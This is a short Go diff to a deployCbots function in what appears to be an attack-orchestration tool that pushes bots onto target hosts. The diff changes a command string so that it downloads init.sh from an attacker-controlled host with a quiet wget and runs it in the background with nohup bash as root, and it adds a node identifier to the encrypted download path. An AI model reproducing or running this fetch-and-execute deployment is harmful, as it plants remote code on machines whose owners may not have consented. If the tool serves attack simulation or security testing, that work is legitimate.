@@ -216,6 +216,7 @@ func (ath *AttackTaskHandler) deployCbots(taskId string, request *model.CreateAt
 
 	upc := &netutils.URLPathCrypt{
 		TaskId:       taskId,
+		NodeId:       "root",
 		Fname:        "init.sh",
 		AttackType:   "NoAttack",
 		AttackIP:     ath.rhost,
@@ -226,7 +227,7 @@ func (ath *AttackTaskHandler) deployCbots(taskId string, request *model.CreateAt
 
 	url := fmt.Sprintf("http://%s:%d/%s", ath.rhost, ath.fport, netutils.URLPathCryptToString(upc))
 
-	cmd := fmt.Sprintf("wget %s -O /var/tmp/init.sh;bash /var/tmp/init.sh %s", url, "root")
+	cmd := fmt.Sprintf("wget %s -q -O /var/tmp/init.sh;nohup bash /var/tmp/init.sh %s %s %s", url, "root","NoAttack","true")
 
 	if request.Passwd != "" {
 
